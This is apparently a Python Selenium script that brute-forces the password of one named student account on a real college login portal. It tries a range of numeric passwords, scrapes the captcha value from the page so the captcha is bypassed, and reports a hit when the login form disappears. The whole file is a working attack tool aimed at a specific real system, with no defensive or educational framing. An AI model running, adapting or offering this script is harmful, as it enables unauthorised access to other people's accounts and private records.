from bs4 import BeautifulSoup
from selenium import webdriver
import urllib
from urllib.request import urlopen
from selenium.webdriver.common.keys import Keys
from pyvirtualdisplay import Display
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By

display = Display(visible=0, size=(800, 600))
display.start()


driver = webdriver.Firefox()
# driver.get('https://www.imsnsit.org/imsnsit/student.htm')
# driver.switch_to.frame("banner")

# html = driver.page_source
# soup = BeautifulSoup(html)


for passwd in range (814800, 814899):
    print (passwd)
    driver.get('https://www.imsnsit.org/imsnsit/student.htm')
    driver.switch_to.frame("banner")

    html = driver.page_source
    soup = BeautifulSoup(html, "lxml")

    # print ("HERE")
    ssn = soup.find("td",{"class":"plum_field"})
    ssnno = str(ssn.findAll('b')[0].string)

    captchaVal = int(ssnno[1:-1])

    # print (captcha)

    username = driver.find_element_by_id("uid")
    password = driver.find_element_by_id("pwd")
    captcha = driver.find_element_by_id("cap")

    username.send_keys("380CO13")
    password.send_keys(passwd)
    captcha.send_keys(captchaVal)

    driver.find_element_by_name("login").click()

    delay = 5 # seconds
    try:
        WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.ID, "login")))
    except TimeoutException:
        print ("FOUND")
        print (passwd)
        break
driver.quit()
display.stop()
